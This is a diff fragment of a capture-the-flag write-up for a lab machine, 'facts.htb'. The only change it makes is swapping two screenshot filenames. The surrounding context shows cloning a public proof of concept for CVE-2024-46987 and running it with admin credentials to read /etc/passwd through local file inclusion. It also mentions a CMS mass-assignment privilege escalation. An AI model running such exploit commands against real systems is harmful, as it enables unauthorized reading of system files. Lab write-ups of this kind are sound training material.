@@ -91,7 +91,7 @@ The Python PoC repository is cloned:
 git clone https://github.com/Goultarde/CVE-2024-46987
 ```
 
-![Git Clone](images/10_git_clone.jpg)
+![Git Clone](images/09_git_clone.jpg)
 
 ### CMS Privilege Escalation — Mass Assignment
 
@@ -115,7 +115,7 @@ With admin credentials the exploit is run to read `/etc/passwd` and discover sys
 python3 CVE-2024-46987.py -u 'http://facts.htb' -l 'JJ' -p 'pepe' '/etc/passwd'
 ```
 
-![LFI Passwd](images/09_lfi_passwd.jpg)
+![LFI Passwd](images/10_lfi_passwd.jpg)
 
 Two users with valid shells are identified: **trivia** and **william**.
 
